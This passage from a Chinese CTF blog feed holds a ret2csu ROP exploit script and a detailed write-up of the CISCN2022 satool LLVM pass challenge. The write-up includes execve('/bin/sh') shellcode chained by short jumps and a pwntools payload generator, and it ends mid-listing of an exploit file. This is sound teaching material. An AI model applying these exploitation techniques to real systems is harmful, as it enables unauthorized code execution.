*</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libret2csu.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ROP_1 = <span class="number">0x40069a</span></span><br><span class="line">ROP_2 = <span class="number">0x400680</span></span><br><span class="line">rdi = <span class="number">0x4006a3</span></span><br><span class="line">call = <span class="number">0x400689</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)<span class="comment"># pop the first argument</span></span><br><span class="line">payload += p64(ROP_1)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x4003B0</span>) + p64(<span class="number">0xdeadbeefdeadbeef</span>) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(ROP_2)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>) </span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;ret2win&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/32a654e812b34273ae0f8775c5dc5c39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>由此可见，在做题的过程中，转换思路很重要。一条指令可以有用，也可以无用。可能需要精心构造进入，也可能需要精心构造绕过。全方位思考，整合程序中的所有资源为己所用，方能在pwn的世界纵横捭阖，左右逢源。要学的东西，还有很多……</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ROP Emporium x86_64 7~8题</title>
      <link href="/2023/02/28/ROP-Emporium-x86-64-7-8%E9%A2%98/"/>
      <url>/2023/02/28/ROP-Emporium-x86-64-7-8%E9%A2%98/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LLVM pass pwn 入门 (4)</title>
      <link href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-4/"/>
      <url>/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-4/</url>
      
        <content type="html"><![CDATA[<p>有了前面两道题的分析基础之后，我们不难发现，LLVM实际上就是一类基于C++的VM pwn，我们通过定义不同名字的函数或写入不同类型的指令让vm做一些事情，其中就包含触发漏洞。这篇文章笔者来分析一下2022年，也就是今年国赛题中的satool这道题。</p><h1 id="CISCN2022-satool"><a href="#CISCN2022-satool" class="headerlink" title="CISCN2022-satool"></a>CISCN2022-satool</h1><h2 id="Step-1-通过README了解这个LLVM-pass的功能"><a href="#Step-1-通过README了解这个LLVM-pass的功能" class="headerlink" title="Step 1: 通过README了解这个LLVM pass的功能"></a>Step 1: 通过README了解这个LLVM pass的功能</h2><p>附件一共给了两个文件，有一个是readme文件，打开看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">## Introduction</span><br><span class="line"></span><br><span class="line">A LLVM Pass that can optimize add/sub instructions.</span><br><span class="line"></span><br><span class="line">## How to run</span><br><span class="line"></span><br><span class="line">opt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S</span><br><span class="line"></span><br><span class="line">## Example</span><br><span class="line"></span><br><span class="line">### IR before optimization</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class="line">  %2 = sub nsw i64 %0, 2</span><br><span class="line">  %3 = add nsw i64 %2, 68</span><br><span class="line">  %4 = add nsw i64 %0, 6</span><br><span class="line">  %5 = add nsw i64 %4, -204</span><br><span class="line">  %6 = add nsw i64 %5, %3</span><br><span class="line">  ret i64 %6</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### IR after optimization</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class="line">  %2 = mul i64 %0, 2</span><br><span class="line">  %3 = add i64 %2, -132</span><br><span class="line">  ret i64 %3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个优化加减法的llvm pass，就像上面例子演示的一样，将多步加减法转换为两步的乘法和加法，即一个简单的合并同类项的优化。对于这种涉及算法的逆向，我们不妨首先想想，如果自己需要实现这个功能，应该如何编写算法。<br>现在我们来看看源码中有什么漏洞。</p><h2 id="Step-2-找到runOnFunction覆写函数"><a href="#Step-2-找到runOnFunction覆写函数" class="headerlink" title="Step 2: 找到runOnFunction覆写函数"></a>Step 2: 找到runOnFunction覆写函数</h2><p>这道题的源码中没有无名的函数，这是因为符号表还在，更便于我们理解程序逻辑。当符号表还在的时候，我们应该找的是匿名命名空间的函数，别忘了第一篇文章中我们自己写的示例，就是将函数声什么的全部写在一个匿名空间中的。由此我们很容易能够找到runOnFunction函数。</p><p><img src="https://img-blog.csdnimg.cn/b243bbd9987b459ba83891e62643c9cb.png"><br>接下来，我们进入runOnFunction查看。</p><h2 id="Step-3-分析runOnFunction函数"><a href="#Step-3-分析runOnFunction函数" class="headerlink" title="Step 3: 分析runOnFunction函数"></a>Step 3: 分析runOnFunction函数</h2><h3 id="Segment-1"><a href="#Segment-1" class="headerlink" title="Segment 1"></a>Segment 1</h3><p><img src="https://img-blog.csdnimg.cn/78bc9ea1648647e9930dfe372d759305.png"><br>进入函数，首先是一个判断，通过报错字符串信息可以得知，这里是限定我们的函数只能有一个参数和一个基本块。</p><h2 id="Segment-2"><a href="#Segment-2" class="headerlink" title="Segment 2"></a>Segment 2</h2><p><img src="https://img-blog.csdnimg.cn/437cd9a6f8c44e17ad6374cbc939be1d.png"><br>接下来是调用了两个MBAPass类中的函数，首先查看MBAPass类的构造函数可知，this+4指针指向了一个mmap空间，大小为0x1000。首先其将这块内存的权限改为可写可执行，然后执行了handle函数，之后再将权限改为可读可执行，执行callCode函数。我们还是首先看下这两个函数的执行流程。</p><h2 id="Step-4-分析handle函数"><a href="#Step-4-分析handle函数" class="headerlink" title="Step 4: 分析handle函数"></a>Step 4: 分析handle函数</h2><p>handle函数传入的第一个参数是MBAPass对象自身，第二个参数v29是llvm.Function指针。打开handle一看，好家伙这么多代码，一点点分析。</p><h3 id="Segment-1-1"><a href="#Segment-1-1" class="headerlink" title="Segment 1"></a>Segment 1</h3><p><img src="https://img-blog.csdnimg.cn/f340780663fd49e3b670bd68f9055163.png"><br>猜测：v29是第一个基本块，Terminator是结束符的意思，暂时还不清楚到底指什么，Operand是操作数。</p><h3 id="Segment-2-1"><a href="#Segment-2-1" class="headerlink" title="Segment 2"></a>Segment 2</h3><p><img src="https://img-blog.csdnimg.cn/50a1191c5a544277b8843ee6a20d3d22.png"><br>注意<strong>这里的llvm::isa</strong>相当于Java中的instanceof关键字，判断Operand是否是llvm::constant的实例。如果是，说明这个操作数是一个常量数值，随后将其转换为整型常量并有符号扩展。然后调用了他自己定义的函数writeMovImm64。这个函数的功能是构建机器码指令，一开始想查Intel手册发现看不懂，后来直接用反汇编才试出来。<strong>writeMovImm64的功能是：当第二个参数为0时，向事先mmap的空间中写入”mov rbx, &lt;第三个参数&gt;”指令，若第二个参数不为0则写入”mov rax, &lt;第三个参数&gt;指令”。这两个指令都占10字节，写入完毕后指针后移10准备下一次写入。同理可以试出来writeRet函数就是写入一个”ret”指令</strong>。基于此我们也可以知道this+5这个指针的作用，其是用来作为mmap空间的游标使用的，在指针指向的位置写入指令。<br><img src="https://img-blog.csdnimg.cn/24f603ac287f43e1b315bb590a4a07bd.png"></p><h3 id="Segment-3"><a href="#Segment-3" class="headerlink" title="Segment 3"></a>Segment 3</h3><p><img src="https://img-blog.csdnimg.cn/94d15c81c539401ca79403c0da36f855.png"><br>这里判断操作数是否是函数的参数。然后写入”mov rbx, 0; ret”指令。</p><h3 id="Segment-4"><a href="#Segment-4" class="headerlink" title="Segment 4"></a>Segment 4</h3><p><img src="https://img-blog.csdnimg.cn/fe908aba5cc74c6c8212cd9853a87697.png"><br>如果操作数既不是立即数，又不是参数，那可能是局部变量。在else语句块中首先实例化了两个STL stack对象，分别为v25和v26变量，然后进行了push操作。如果写入指针的游标大于v30，就直接写入一个ret指令返回（<strong>v30&#x3D;mmap内存起始地址+0xFF0，记住这个0xFF0，后面有关键作用</strong>）。</p><h3 id="Segment-5"><a href="#Segment-5" class="headerlink" title="Segment 5"></a>Segment 5</h3><p><img src="https://img-blog.csdnimg.cn/5e8e22d2d73944ae923591726a93505b.png"><br>再次之后弹出了两个栈顶的东西，其中将先弹出的转化为了二元运算符对象，当转换出错时还会报错。说明位于栈顶的应该是一个二元运算符。</p><h3 id="Segment-6"><a href="#Segment-6" class="headerlink" title="Segment 6"></a>Segment 6</h3><p><img src="https://img-blog.csdnimg.cn/70506614627b4db09734c6b3e3f41644.png"><br>后面就开始判断运算符的种类了。还记得运算符的种类应该在哪一个文件里面查询吗？<code>llvm/IR/Instructions.def</code>！查询到13表示的是加法，15表示的是减法。这里的意思是二元运算符只能是加或减，否则报错退出。</p><h3 id="Segment-7"><a href="#Segment-7" class="headerlink" title="Segment 7"></a>Segment 7</h3><p><img src="https://img-blog.csdnimg.cn/54d074a0fa7a4e169b4eef938ee15458.png"><br>这里的v20和v19容易猜出来就是二元运算符的两个操作数。</p><p>后面首先判断v20是否是常量。如果是则判断其值是否为1或-1。若是则调用writeInc函数写入”inc rax”或”dec rax”指令，若不是则调用writeOpReg函数写入”add rax, rbx”指令（第二个参数是1。若第二个参数为0就是”sub rax, rbx”指令）。</p><p>如果v20是参数，则在this+12处加上v22。至于this+22是什么尚且不清楚，后面再行判断。</p><p>如果既不是常量也不是参数，则push压栈。通过栈后面的类型可以知道，v25中的值一定都是整数，而v26中的值是对象，其可以表示变量也可以表示一个常量。</p><h3 id="Segment-8"><a href="#Segment-8" class="headerlink" title="Segment 8"></a>Segment 8</h3><p><img src="https://img-blog.csdnimg.cn/b60f7dcfde334f4183032f9efc5a42fd.png"><br>handle函数的最后一个部分，和Segment 7相同，Segment 7处理的是加减法的第一个操作数，而Segment 8以同样的方式处理第二个操作数。不过在此之前有一个判断符号的if语句，当运算为减的时候会将v22取相反数。</p><p>看到这里，我们已经对handle函数有了一些初步的了解，但是在细节方面的理解还是不够透彻。因此我们来尝试写一个函数，看看handle函数处理的全过程到底是什么样的。</p><p>这是根据readme函数改编的一段代码，只有后面的数值修改了（注意本题的.ll文件不能通过clang生成，因为clang生成的.ll代码会有一些store等其他指令的存在，mbapass无法识别）。我们下断点到stack析构函数调用的地方，也就是handle函数的末尾，看一下此时this+4这个mmap空间的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i64 @test(i64 %0) #0 &#123;</span><br><span class="line">  %2 = sub nsw i64 %0, 285912734</span><br><span class="line">  %3 = add nsw i64 %2, 685392891</span><br><span class="line">  %4 = add nsw i64 %0, 653902180</span><br><span class="line">  %5 = add nsw i64 %4, -204343281</span><br><span class="line">  %6 = add nsw i64 %5, %3</span><br><span class="line">  ret i64 %6</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;Ubuntu clang version 12.0.0-3ubuntu1~20.04.5&quot;&#125;</span><br></pre></td></tr></table></figure><p>下面是mmap空间的情况：<br><img src="https://img-blog.csdnimg.cn/7a4204a187e54d038171d40066bc5400.png"><br>可以看出handle函数将我们的5行代码转换为了汇编指令保存。和静态分析的结果符合、</p><h2 id="Step-5-分析callCode函数，思考利用方式"><a href="#Step-5-分析callCode函数，思考利用方式" class="headerlink" title="Step 5: 分析callCode函数，思考利用方式"></a>Step 5: 分析callCode函数，思考利用方式</h2><p><img src="https://img-blog.csdnimg.cn/d7345dfc09454e5d8d308560b6ef345f.png"><br>callCode函数很简单，就是执行刚刚写入到mmap空间的汇编指令。</p><p>由此可见，我们可以执行这一段指令。但是这里的指令只能是有限的几种，并不能达到我们的目的。不过别忘了我们第4步分析handle函数时注意到的一个小细节：当生成的汇编指令长度大于0xFF0时，handle函数不会再继续向下解析.ll代码，而是会直接退出。但很明显我们完全有可能让handle函数生成的汇编指令长度比0xFF0大几个字节，即让最后一条指令越过0xFF0的边界。注意其依然会执行。而且<strong>mmap出来的空间没有被释放</strong>，这说明当handle函数解析第二个函数的时候，我们之前解析得到的指令还保留在mmap空间中。如果两次解析出来的指令有错位，就可能会产生新的指令。</p><p>如第一次解析的指令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movabs rax, 0; 0x0</span><br><span class="line">movabs rax, 0x12345678; 0xA</span><br><span class="line">mov rbx, rax; 0x14</span><br><span class="line">movabs rax, 0x87654321; 0x1E</span><br></pre></td></tr></table></figure><p>第二次解析的指令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movabs rax, 0; 0x0</span><br><span class="line">movabs rax, 0x12345678; 0xA</span><br><span class="line">mov rbx, rax; 0x14</span><br><span class="line">mov rbx, rax; 0x17</span><br></pre></td></tr></table></figure><p>那么对于0x1A~0x1E这5个字节，如果有实际含义的话，很可能会被当成汇编指令执行，而这5个字节在第一次解析中是作为立即数存在，是可以被我们随意控制的。由此我们就可以执行一条长度不大于5字节的任意指令。不过需要注意的是，如果我们写的汇编指令长度不足0xFF0字节，在循环中会写入一个ret指令进去，跳出循环的条件就是汇编指令长度大于0xFF0，因此要想循环中添加ret指令的这个函数不调用，就必须要使得写入的汇编指令长度大于0xFF0字节，这样才能够执行0xFF0后面几个字节的任意代码。</p><p>通过测试我们可以发现，inc指令占用3字节，mov rax, rbx指令占用3字节，向rax或rbx直接赋值占用10字节。由于3和10的最大公因数为1，因此我们可以构造任意长度在0xFF0左右的汇编代码。但是很明显，不可能有shellcode能够用仅仅几个字节就getshell。考虑到我们可以控制movabs指令中的后8字节，可以将shellcode写到这一个个的8字节之中，再通过短转移指令将它们连接在一起，就有可能执行一个完整的shellcode。<strong>注意：短转移指令的长度为2字节，因此每一个8字节中的指令不能超过6字节。因此现有的shellcode可能无法直接使用，需要我们根据实际的调试结果进行一定的调整。</strong></p><p>为了shellcode编写的方便，我们将movabs指令作为我们写入的主要指令。通过前面的调试结果可以得知，绝大多数的movabs指令后面都回跟上一个add rax, rbx指令。我们人为规定每一个movabs中写入一条指令，然后通过短转移指令跳到前面一个movabs中的指令。</p><p>下面，我们就来构造我们预期要执行的shellcode。</p><h2 id="Step-6-构造shellcode"><a href="#Step-6-构造shellcode" class="headerlink" title="Step 6: 构造shellcode"></a>Step 6: 构造shellcode</h2><p>我们直接使用pwntools中给出的模板，在其基础上进行修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">/* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">push 0x68</span><br><span class="line">mov rax, 0x732f2f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">/* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">/* push b&#x27;sh\x00&#x27; */</span><br><span class="line">push 0x1010101 ^ 0x6873</span><br><span class="line">xor dword ptr [rsp], 0x1010101</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">push rsi /* null terminate */</span><br><span class="line">push 8</span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx /* 0 */</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve /* 0x3b */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><ol><li><code>push 0x68</code>：机器码<code>jh</code>，占用2字节。</li><li><code>mov rax, 0x732f2f2f6e69622f</code>：占用10字节，进行改写：<br> (1) <code>mov eax, 0x732f2f2f</code>：机器码<code>\xb8///s</code>，占用5字节。<br> (2) <code>shl rax, 32</code>：机器码<code>H\xc1\xe0&lt;space&gt;</code>，占用4字节（&lt;space&gt;指空格）。<br> (3) <code>add rax, 0x6e69622f</code>：机器码<code>H\x05/bin</code>，占用6字节。</li><li><code>push rax</code>：机器码<code>P</code>，占用1字节。</li><li><code>mov rdi, rsp</code>：机器码<code>H\x89\xe7</code>，占用3字节。</li><li><code>push 0x1010101 ^ 0x6873</code>：机器码<code>hri\x01\x01</code>，但其与下一步可以合并：<br> <code>push 0x6873</code>：机器码<code>hsh\x00\x00</code>，占用5字节。</li><li><code>xor esi, esi</code>：机器码<code>1\xf6</code>，占用2字节。</li><li><code>push rsi</code>：机器码<code>V</code>，占用1字节。</li><li><code>push 8</code>：机器码<code>j\x08</code>，占用2字节。</li><li><code>pop rsi</code>：机器码<code>^</code>，占用1字节。</li><li><code>add rsi, rsp</code>：机器码<code>H\x01\xe6</code>，占用3字节。</li><li><code>push rsi</code>：机器码<code>V</code>，占用1字节。</li><li><code>mov rsi, rsp</code>：机器码<code>H\x89\xe6</code>，占用3字节。</li><li><code>xor edx, edx</code>：机器码<code>1\xd2</code>，占用2字节。</li><li><code>push SYS_execve</code>：机器码<code>j;</code>，占用2字节。</li><li><code>pop rax</code>：机器码<code>X</code>，占用1字节。</li><li><code>syscall</code>：机器码<code>\x0f\x05</code>，占用2字节。</li></ol><p>机器码分析完毕。我们发现有一些指令很短，可以几条合并。如3和4合并、6和7和8和9合并、10和11合并、12和13合并、14和15和16合并。但是为了批量生成指令机器码的方便，每个8字节中只填充一个shellcode指令。我们让短转移指令固定在最后2字节，前面的指令不够6字节的使用nop指令补充。我们使用脚本尝试生成一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = [</span><br><span class="line"> <span class="string">&quot;push 0x68&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mov eax, 0x732f2f2f&quot;</span>,</span><br><span class="line">      <span class="string">&quot;shl rax, 32&quot;</span>,</span><br><span class="line">      <span class="string">&quot;add rax, 0x6e69622f&quot;</span>,</span><br><span class="line">      <span class="string">&quot;push rax&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mov rdi, rsp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;push 0x6873&quot;</span>,</span><br><span class="line">      <span class="string">&quot;xor esi, esi&quot;</span>,</span><br><span class="line">      <span class="string">&quot;push rsi&quot;</span>,</span><br><span class="line">      <span class="string">&quot;push 8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;pop rsi&quot;</span>,</span><br><span class="line">      <span class="string">&quot;add rsi, rsp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;push rsi&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mov rsi, rsp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;xor edx, edx&quot;</span>,</span><br><span class="line">      <span class="string">&quot;push SYS_execve&quot;</span>,</span><br><span class="line">      <span class="string">&quot;pop rax&quot;</span>,</span><br><span class="line">      <span class="string">&quot;syscall&quot;</span></span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> shellcode:</span><br><span class="line"><span class="built_in">bytes</span> = asm(code).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x90&#x27;</span>) + <span class="string">b&#x27;\xEB\xE9&#x27;</span><span class="comment"># \xEB\xEB: jmp short ptr -21, 思考一下-21这个数是怎么得出来的</span></span><br><span class="line"><span class="built_in">print</span>(u64(<span class="built_in">bytes</span>))</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">16999840169015142506</span><br><span class="line">16999840042827329464</span><br><span class="line">16999840167141359944</span><br><span class="line">16999802617337939272</span><br><span class="line">16999840169015152720</span><br><span class="line">16999840169020852552</span><br><span class="line">16999839548121314152</span><br><span class="line">16999840169015178801</span><br><span class="line">16999840169015152726</span><br><span class="line">16999840169015117930</span><br><span class="line">16999840169015152734</span><br><span class="line">16999840169020752200</span><br><span class="line">16999840169015152726</span><br><span class="line">16999840169020787016</span><br><span class="line">16999840169015169585</span><br><span class="line">16999840169015130986</span><br><span class="line">16999840169015152728</span><br><span class="line">16999840169015117071</span><br></pre></td></tr></table></figure><p>接下来，我们要进行调试，构造出能够产生jmp指令两个长函数以供handle函数解析。</p><h2 id="Step-7-getshell"><a href="#Step-7-getshell" class="headerlink" title="Step 7: getshell"></a>Step 7: getshell</h2><p>我们在一个函数中写入很多的add指令，就像下面这样。经过测试得出&#x3D;，当写到%315时，有一个movabs指令能够成功溢出到0xFF0之后，不过这是第一条指令。因此我们写shellcode应该写在前面几个指令中。<br><img src="https://img-blog.csdnimg.cn/d43cca331f9c4703b6402a436cedd8bd.png"><br>下面是解析第一个函数后最后几个字节的情况：<br><img src="https://img-blog.csdnimg.cn/3b2ec09e96ae43f7b5d191554bf2de7a.png"><br>下面是解析第二个函数后最后几个字节的情况：<br><img src="https://img-blog.csdnimg.cn/237654158a854473b314fddfd2811616.png"><br>由下图可以得出，我们可以控制的是第一个函数最后一个movabs中最后的4个字节：<br><img src="https://img-blog.csdnimg.cn/6398372ff68541bca851abeb2f0d9a25.png"><br>根据下图可知，第一个短转移（即图中的jmp）偏移应该为：<code>-(0xff3-(0xfde+2))=-0x13=0xed</code><br><img src="https://img-blog.csdnimg.cn/25d169db5d074b67818830a540251cda.png"><br>如图所示，这样就可以跳转到我们的第一个shellcode了。第一个立即数的值应该为<code>0xEDEB00000000</code>。（低4字节无所谓）<br><img src="https://img-blog.csdnimg.cn/b652cca58f3b46c48301dc3a0481aee9.png"><br>然后我们只要将上面脚本中的值依次写入到下面即可。<br><img src="https://img-blog.csdnimg.cn/40091d4c0b794a25ab7894184f21f5fa.png"><br>成功getshell。<br><img src="https://img-blog.csdnimg.cn/0fc157a439e64b06a861724e4576d212.png"><br>exp.ll如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span 